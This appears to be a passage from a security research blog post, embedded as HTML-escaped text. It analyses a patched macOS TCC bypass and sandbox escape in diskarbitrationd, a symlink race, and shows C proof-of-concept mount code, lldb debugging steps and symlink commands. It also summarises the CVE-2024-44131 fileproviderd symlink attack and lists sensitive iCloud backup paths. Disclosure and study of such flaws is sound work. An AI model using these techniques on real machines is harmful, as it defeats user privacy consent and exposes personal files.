+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/1/2/3/../../../Users/crab/Library/Application Support/com.apple.TCC
+/private/tmp/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;As a result, this path is allowed to be mounted inside &lt;code&gt;/private/tmp/&lt;/code&gt;, enabling it to pass security checks.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;3. Remove the Symbolic Link and Execute the Mount&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/private/tmp/**starthere**/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once the &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; check is complete, delete the symbolic link and replace it with an empty directory. After that, &lt;code&gt;diskarbitrationd&lt;/code&gt; will execute the external mount command again, using the same path as before.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;/Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;However, this time, &lt;code&gt;starthere&lt;/code&gt; is a &lt;strong&gt;directory&lt;/strong&gt; instead of a &lt;strong&gt;symbolic link&lt;/strong&gt;, meaning the final transformation remains the same as before.&lt;/p&gt;
+&lt;p&gt;Since the path no longer contains a symbolic link, the &lt;strong&gt;kernel will process it as a regular path&lt;/strong&gt;. Moreover, because the calling process is &lt;code&gt;diskarbitrationd&lt;/code&gt;, which possesses the &lt;code&gt;com.apple.private.security.storage-exempt.heritable&lt;/code&gt; privilege, it is able to &lt;strong&gt;bypass the kernel&amp;#x2019;s Mandatory Access Control Framework (MACF) Sandbox checks&lt;/strong&gt;. As a result, this method works even within the sandbox.&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;4. TCC Bypass and Sandbox Escape&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;By following &lt;strong&gt;steps 1&amp;#x2013;3&lt;/strong&gt;, you can successfully perform a &lt;strong&gt;TCC Bypass&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;To further &lt;strong&gt;escape the sandbox&lt;/strong&gt;, you can &lt;strong&gt;mount the &lt;code&gt;~/Library/Preferences&lt;/code&gt; directory&lt;/strong&gt; using a similar technique. By doing so, you can place a custom Terminal preference file that &lt;strong&gt;automatically executes specific commands&lt;/strong&gt; when Terminal is opened.&lt;/p&gt;
+&lt;p&gt;In essence, this vulnerability is a &lt;strong&gt;Time of Check to Time of Use (TOCTOU) bug&lt;/strong&gt;, functioning similarly to the vulnerability described in &lt;a href=&#34;https://hackyboiz.github.io/2024/11/27/clalxk/CVE-2024-44175/&#34;&gt;a previous post&lt;/a&gt;.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;Explain-2&#34;&gt;&lt;a href=&#34;#Explain-2&#34; class=&#34;headerlink&#34; title=&#34;Explain 2&#34;&gt;&lt;/a&gt;Explain 2&lt;/h3&gt;&lt;p&gt;Let&amp;#x2019;s replicate &lt;strong&gt;Explain 1&lt;/strong&gt; using a debugger.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#import &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;DiskArbitration/DiskArbitration.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&#34;hljs-meta&#34;&gt;#import &lt;span class=&#34;hljs-meta-string&#34;&gt;&amp;lt;Foundation/Foundation.h&amp;gt;&lt;/span&gt;&lt;/span&gt;
+
+&lt;span class=&#34;hljs-function&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;hljs-title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;hljs-params&#34;&gt;(&lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt;)&lt;/span&gt; &lt;/span&gt;{
+    DASessionRef session = DASessionCreate(kCFAllocatorDefault);
+    DADiskRef disk = DADiskCreateFromBSDName(kCFAllocatorDefault, session, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev/disk6s1&amp;quot;&lt;/span&gt;);
+    CFDictionaryRef properties;
+    CFURLRef diskurl = (__bridge CFURLRef)[NSURL fileURLWithPath:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/dev/disk6s1&amp;quot;&lt;/span&gt;];
+    CFURLRef url = (__bridge CFURLRef)[NSURL fileURLWithPath:@&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&amp;quot;&lt;/span&gt;];
+    DADiskMount(disk, url, kDADiskMountOptionDefault, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;hljs-literal&#34;&gt;NULL&lt;/span&gt;);
+    &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The code above attempts to mount a disk at the path:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Compile the code, start debugging using &lt;code&gt;lldb&lt;/code&gt;, and set the following breakpoints:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs bash&#34;&gt;(lldb) breakpoint list
+Current breakpoints:
+1: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;realpath&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 0
+  1.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = libsystem_c.dylib`realpath, address = 0x00000001921de874, resolved, hit count = 0 
+2: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;DADiskMountWithArgumentsCommon&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 1
+  2.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`DADiskMountWithArgumentsCommon, address = 0x000000019a1bdb48, resolved, hit count = 1 
+3: address = DiskArbitration[0x0000000188325c1c], locations = 1, resolved = 1, hit count = 1
+  3.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`DADiskMountWithArgumentsCommon + 212, address = 0x000000019a1bdc1c, resolved, hit count = 1 
+4: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;__DAQueueRequest&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 1
+  4.1: &lt;span class=&#34;hljs-built_in&#34;&gt;where&lt;/span&gt; = DiskArbitration`__DAQueueRequest, address = 0x000000019a1bcde0, resolved, hit count = 1&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Attach &lt;code&gt;lldb&lt;/code&gt; to the &lt;code&gt;diskarbitrationd&lt;/code&gt; process and set a breakpoint for &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) breakpoint list
+Current breakpoints:
+2: name = &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;sandbox_check_by_audit_token&amp;apos;&lt;/span&gt;, locations = 1, resolved = 1, hit count = 4
+  2.1: where = libsystem_sandbox.dylib`sandbox_check_by_audit_token,&lt;span class=&#34;hljs-built_in&#34;&gt; address &lt;/span&gt;= 0x000000019d5a61cc, resolved, hit count = 4&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Prepare the required &lt;strong&gt;symbolic links and directories&lt;/strong&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs gradle&#34;&gt;ln -s &lt;span class=&#34;hljs-regexp&#34;&gt;/private/&lt;/span&gt;tmp&lt;span class=&#34;hljs-regexp&#34;&gt;/deep/&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/2 /&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;private&lt;/span&gt;&lt;span class=&#34;hljs-regexp&#34;&gt;/tmp/&lt;/span&gt;starthere
+mkdir -p &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/Users/crab/Library/Application Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;Debugging with LLDB After Execution&lt;/strong&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Run the program and reach a breakpoint&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) run
+Process 1591 launched: &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;/Users/crab/m&amp;apos;&lt;/span&gt; (arm64)
+Process 1591 stopped
+* thread #1,&lt;span class=&#34;hljs-built_in&#34;&gt; queue &lt;/span&gt;= &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;com.apple.main-thread&amp;apos;&lt;/span&gt;, stop reason = breakpoint 2.1&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Perform a memory dump on the address pointed to by the &lt;code&gt;X1&lt;/code&gt; register&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;(lldb) memory read -f p $x1
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000024060&lt;/span&gt;: &lt;span class=&#34;hljs-number&#34;&gt;0x01000001fa131911&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0001cc4fc6001d80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0800010060015821&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify the path string&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs angelscript&#34;&gt;(lldb) memory read -f s &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;+&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000f24010&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;^file:///private/tmp/starthere/../../../Users/crab/Library/Application%20Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Stop at the &lt;code&gt;__DAQueueRequest&lt;/code&gt; breakpoint and check the value of the &lt;code&gt;X4&lt;/code&gt; register&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt; $x4
+      x4 = &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000020000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify the path string&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs perl&#34;&gt;(lldb) memory &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt; -f &lt;span class=&#34;hljs-keyword&#34;&gt;s&lt;/span&gt; $x4+&lt;span class=&#34;hljs-number&#34;&gt;16&lt;/span&gt;
+&lt;span class=&#34;hljs-number&#34;&gt;0x600000020010&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Kfile:///private/tmp/Users/crab/Library/Application%20Support/com.apple.TCC/&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Overwrite the &lt;code&gt;X4&lt;/code&gt; register with the original path value&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;write&lt;/span&gt; $x4 &lt;span class=&#34;hljs-number&#34;&gt;0x0000600000f24000&lt;/span&gt;
+(lldb) c
+&lt;span class=&#34;hljs-built_in&#34;&gt;Process&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1606&lt;/span&gt; resuming&lt;/code&gt;&lt;/pre&gt;
+&lt;hr&gt;
+&lt;ol&gt;
+&lt;li&gt;The &lt;code&gt;diskarbitrationd&lt;/code&gt; process stops at the &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; breakpoint.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs routeros&#34;&gt;(lldb) c
+Process 113 resuming
+Process 113 stopped
+* thread #2,&lt;span class=&#34;hljs-built_in&#34;&gt; queue &lt;/span&gt;= &lt;span class=&#34;hljs-string&#34;&gt;&amp;apos;DAServer&amp;apos;&lt;/span&gt;, stop reason = breakpoint 2.1&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Verify that the path remains unchanged via memory dump&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs stata&#34;&gt;(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;memory&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;read&lt;/span&gt; -f s 0x000000014ea0cc90
+0x14ea0cc90: &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;/private/tmp/starthere/../../../Users/crab/Library/Application Support/com.apple.TCC&amp;quot;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;Check the return value after calling &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs arduino&#34;&gt;(lldb) finish
+(lldb) &lt;span class=&#34;hljs-keyword&#34;&gt;register&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;read&lt;/span&gt; $x0
+      x0 = &lt;span class=&#34;hljs-number&#34;&gt;0x0000000000000000&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Since &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt; returns &lt;code&gt;0&lt;/code&gt;, the check is passed.&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Replace &lt;code&gt;starthere&lt;/code&gt; with a directory, run &lt;code&gt;diskarbitrationd&lt;/code&gt;, and verify the mount result&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs awk&#34;&gt;crab@see /tmp % rm starthere
+crab@see /tmp % mkdir starthere
+
+(lldb) c
+
+crab@see /tmp % mount
+...
+&lt;span class=&#34;hljs-regexp&#34;&gt;/dev/&lt;/span&gt;disk6s1 on &lt;span class=&#34;hljs-regexp&#34;&gt;/Users/&lt;/span&gt;crab&lt;span class=&#34;hljs-regexp&#34;&gt;/Library/&lt;/span&gt;Application Support/com.apple.TCC (apfs, local, nodev, nosuid, journaled, noowners, mounted by crab)&lt;/code&gt;&lt;/pre&gt;
+&lt;h2 id=&#34;Patch-Notes&#34;&gt;&lt;a href=&#34;#Patch-Notes&#34; class=&#34;headerlink&#34; title=&#34;Patch Notes&#34;&gt;&lt;/a&gt;Patch Notes&lt;/h2&gt;&lt;p&gt;Apple has fixed this vulnerability in macOS Sequoia 15.0.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( mntpath )
+{
+    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( ( _argument1 &amp;amp; kDADiskMountOptionNoFollow ) == &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; )
+    {
+        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( realpath( mntpath, path ) )
+        {
+            CFTypeRef mountpath = CFURLCreateFromFileSystemRepresentation( kCFAllocatorDefault, ( &lt;span class=&#34;hljs-keyword&#34;&gt;void&lt;/span&gt; * ) path, &lt;span class=&#34;hljs-built_in&#34;&gt;strlen&lt;/span&gt;( path ), TRUE );
+            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; ( mountpath )
+            {
+                DARequestSetArgument2( request, CFURLGetString( mountpath ) );
+                CFRelease ( mountpath );
+            }
+        }
+        &lt;span class=&#34;hljs-keyword&#34;&gt;else&lt;/span&gt;
+        {
+            status = kDAReturnBadArgument;
+        }
+    }
+}&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;They now perform path resolution within &lt;code&gt;diskarbitrationd&lt;/code&gt; when handling requests instead of relying on the client side. This prevents attackers from injecting paths containing &lt;code&gt;../&lt;/code&gt; elements while maintaining the expected behavior for legitimate callers.&lt;/p&gt;
+&lt;p&gt;However, this validation logic is only applied if the &lt;code&gt;kDADiskMountOptionNoFollow&lt;/code&gt; flag is &lt;strong&gt;not&lt;/strong&gt; provided. If an attacker explicitly sets &lt;code&gt;kDADiskMountOptionNoFollow&lt;/code&gt;, the original attack would still be possible.&lt;/p&gt;
+&lt;p&gt;To fully mitigate this, Apple made an additional change to &lt;code&gt;sandbox_check_by_audit_token&lt;/code&gt;:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;hljs c&#34;&gt;status = sandbox_check_by_audit_token(_token, &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;file-mount&amp;quot;&lt;/span&gt;, SANDBOX_FILTER_PATH | SANDBOX_CHECK_ALLOW_APPROVAL | SANDBOX_CHECK_CANONICAL, path);&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The &lt;code&gt;SANDBOX_CHECK_CANONICAL&lt;/code&gt; option was added to the validation process. With this, the sandbox check now &lt;strong&gt;automatically fails&lt;/strong&gt; if the path contains symbolic links or directory traversal elements (&lt;code&gt;../&lt;/code&gt;). This allows the system to block the attack at an earlier stage.&lt;/p&gt;
+&lt;h1 id=&#34;3-Other-Types-of-TCC-Bypass-Vulnerabilities&#34;&gt;&lt;a href=&#34;#3-Other-Types-of-TCC-Bypass-Vulnerabilities&#34; class=&#34;headerlink&#34; title=&#34;3. Other Types of TCC Bypass Vulnerabilities&#34;&gt;&lt;/a&gt;3. Other Types of TCC Bypass Vulnerabilities&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;CVE-2024-44131&#34;&gt;&lt;a href=&#34;#CVE-2024-44131&#34; class=&#34;headerlink&#34; title=&#34;CVE-2024-44131&#34;&gt;&lt;/a&gt;CVE-2024-44131&lt;/h3&gt;&lt;blockquote&gt;
+&lt;p&gt;This is a TCC bypass vulnerability in File Provider, an extension that allows users to access files and folders synchronized with remote storage (such as iCloud) on macOS and iOS. The vulnerability arises due to a symlink validation flaw when the Files app and the fileproviderd system process handle file operations.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;Version-Information-1&#34;&gt;&lt;a href=&#34;#Version-Information-1&#34; class=&#34;headerlink&#34; title=&#34;Version Information&#34;&gt;&lt;/a&gt;&lt;strong&gt;Version Information&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;macOS : 5.3 &amp;#x2264; 14.7&lt;/p&gt;
+&lt;h3 id=&#34;File-Provider&#34;&gt;&lt;a href=&#34;#File-Provider&#34; class=&#34;headerlink&#34; title=&#34;File Provider?&#34;&gt;&lt;/a&gt;File Provider?&lt;/h3&gt;&lt;p&gt;A &lt;strong&gt;File Provider&lt;/strong&gt; is an extension that allows other apps to access files and folders synchronized with remote storage.&lt;/p&gt;
+&lt;p&gt;macOS and iOS use the &lt;strong&gt;Transparency, Consent, and Control (TCC)&lt;/strong&gt; mechanism to notify users when an application attempts to access sensitive information&amp;#x2014;such as &lt;strong&gt;photos, GPS location, contacts, etc.&lt;/strong&gt;&amp;#x2014;and allows them to approve or deny the request.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://developer.apple.com/documentation/fileprovider&#34;&gt;Apple Documentation on File Provider&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;The vulnerability exploits a &lt;strong&gt;symlink attack&lt;/strong&gt; targeting the &lt;strong&gt;Files app&lt;/strong&gt; and the &lt;strong&gt;&lt;code&gt;fileproviderd&lt;/code&gt; system process&lt;/strong&gt;.&lt;/p&gt;
+&lt;h3 id=&#34;Key-Components-Involved-in-the-Attack&#34;&gt;&lt;a href=&#34;#Key-Components-Involved-in-the-Attack&#34; class=&#34;headerlink&#34; title=&#34;Key Components Involved in the Attack&#34;&gt;&lt;/a&gt;&lt;strong&gt;Key Components Involved in the Attack&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&amp;#x1F4C1; &lt;strong&gt;Files.app&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;The default file explorer on iOS and macOS. It allows users to browse and manage files in iCloud Drive, local storage, external storage devices, and third-party cloud services (e.g., Google Drive, Dropbox).&lt;/p&gt;
+&lt;p&gt;&amp;#x2699;&amp;#xFE0F; &lt;strong&gt;fileproviderd&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;A system process in macOS and iOS that manages the &lt;strong&gt;File Provider&lt;/strong&gt; extension. It plays a crucial role in handling file synchronization and access between the Files app and cloud storage.&lt;/p&gt;
+&lt;h3 id=&#34;How-the-Attack-Works&#34;&gt;&lt;a href=&#34;#How-the-Attack-Works&#34; class=&#34;headerlink&#34; title=&#34;How the Attack Works&#34;&gt;&lt;/a&gt;&lt;strong&gt;How the Attack Works&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;When a user moves or copies a file using &lt;strong&gt;Files.app&lt;/strong&gt;, a malicious app running in the background can intercept and manipulate the operation. The attacker &lt;strong&gt;exploits the high privileges of &lt;code&gt;fileproviderd&lt;/code&gt;&lt;/strong&gt; to interfere with file operations &lt;strong&gt;without triggering a TCC prompt (permission request window).&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;Typically, mitigation techniques prevent attackers from exploiting &lt;strong&gt;symlink race conditions&lt;/strong&gt; or &lt;strong&gt;path traversal attacks&lt;/strong&gt; when privileged processes copy, move, or delete files. Most file operation APIs include checks to &lt;strong&gt;verify whether the source or destination is a symlink&lt;/strong&gt; and are designed to abort the operation if a symlink is detected.&lt;/p&gt;
+&lt;p&gt;However, in this vulnerability, attackers &lt;strong&gt;bypass the existing checks&lt;/strong&gt; by inserting a symlink &lt;strong&gt;one directory level above&lt;/strong&gt; the target file &lt;strong&gt;midway through the operation&lt;/strong&gt;, instead of placing a symlink directly at the final file path &lt;strong&gt;before&lt;/strong&gt; the operation starts.&lt;/p&gt;
+&lt;h3 id=&#34;Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques&#34;&gt;&lt;a href=&#34;#Comparison-of-Traditional-vs-New-Symlink-Attack-Techniques&#34; class=&#34;headerlink&#34; title=&#34;Comparison of Traditional vs. New Symlink Attack Techniques&#34;&gt;&lt;/a&gt;&lt;strong&gt;Comparison of Traditional vs. New Symlink Attack Techniques&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Traditional Symlink Attack&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers place a &lt;strong&gt;symlink at the final file or directory level&lt;/strong&gt;.&lt;/li&gt;
+&lt;li&gt;Security validation detects the symlink and blocks the attack.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;CVE-2024-44131 Symlink Attack&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Attackers insert a &lt;strong&gt;symlink at the parent directory level&lt;/strong&gt; &lt;em&gt;after&lt;/em&gt; the file copy has started.&lt;/li&gt;
+&lt;li&gt;Since &lt;strong&gt;previous checks only validated the final file/directory name&lt;/strong&gt;, this approach &lt;strong&gt;bypasses the security check&lt;/strong&gt; by altering the path mid-operation.&lt;/li&gt;
+&lt;li&gt;As a result, attackers can &lt;strong&gt;hijack files without triggering a TCC prompt&lt;/strong&gt; or &lt;strong&gt;copy files that require special privileges&lt;/strong&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;Paths-Accessible-by-fileproviderd&#34;&gt;&lt;a href=&#34;#Paths-Accessible-by-fileproviderd&#34; class=&#34;headerlink&#34; title=&#34;Paths Accessible by fileproviderd&#34;&gt;&lt;/a&gt;&lt;strong&gt;Paths Accessible by &lt;code&gt;fileproviderd&lt;/code&gt;&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image5.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&amp;#x1F4CD; &lt;strong&gt;Key Target Path&lt;/strong&gt; &lt;code&gt;/var/mobile/Library/Application Support/FileProvider/AccessControl.db&lt;/code&gt; This database stores a list of apps that have interacted with the Files app and the file system. Attackers can potentially exploit it for unauthorized access.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;/2025/01/19/clalxk/MacOS_TCC-Bypass_en/image6.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;Examples-of-Sensitive-Data-Paths&#34;&gt;&lt;a href=&#34;#Examples-of-Sensitive-Data-Paths&#34; class=&#34;headerlink&#34; title=&#34;Examples of Sensitive Data Paths&#34;&gt;&lt;/a&gt;&lt;strong&gt;Examples of Sensitive Data Paths&lt;/strong&gt;&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Apple Pages backup documents&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/com~apple~Pages&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;Files manually saved to iCloud Drive (including Downloads)&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/com~apple~CloudDocs&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;&lt;strong&gt;WhatsApp backup data&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt; &amp;#x1F4C2; &lt;code&gt;/var/mobile/Library/Mobile Documents/57T9237FN3~net~whatsapp~WhatsApp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt; (&lt;em&gt;This path uses a fixed identifier instead of a UUID, making it predictable for attackers.&lt;/em&gt;)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;By exploiting this vulnerability, attackers can access and exfiltrate &lt;strong&gt;iCloud backup data&lt;/strong&gt; belonging to both first-party and third-party apps. They can do this by &lt;strong&gt;copying, moving, or deleting&lt;/strong&gt; files and directories under the main target data path: &amp;#x1F4C2; &lt;strong&gt;&lt;code&gt;/var/mobile/Library/Mobile Documents/&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;Ref&#34;&gt;&lt;a href=&#34;#Ref&#34; class=&#34;headerlink&#34; title=&#34;Ref&#34;&gt;&lt;/a&gt;Ref&lt;/h3&gt;&lt;p&gt;&lt;a href=&#34;https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/&#34;&gt;https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://zeroclick.sh/blog/macos-tcc/&#34;&gt;https://zeroclick.sh/blog/macos-tcc/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses&#34;&gt;https://www.cyberlibrary.fr/en/docs/old/macos-tcc-bypasses&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/&#34;&gt;https://eclecticlight.co/2023/02/10/privacy-what-tcc-does-and-doesnt/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.kandji.io/blog/macos-audit-story-part2&#34;&gt;https://www.kandji.io/blog/macos-audit-story-part2&lt;/a&gt;&lt;/p&gt;
+ - hack &amp; life">
+  <meta property="og:image" content="https://hackyboiz.github.io/2025/01/19/clalxk/MacOS_TCC-Bypass_ko/TCC_Bypass.png">
+  <meta property="og:url" content="https://hackyboiz.github.io/">
+
+  <link rel="canonical" href="https://hackyboiz.github.io/2025/01/19/clalxk/macos_tcc-bypass_en/">
+
+  <title>[Research] MacOS TCC Bypass (en) - hackyboiz</title>
+
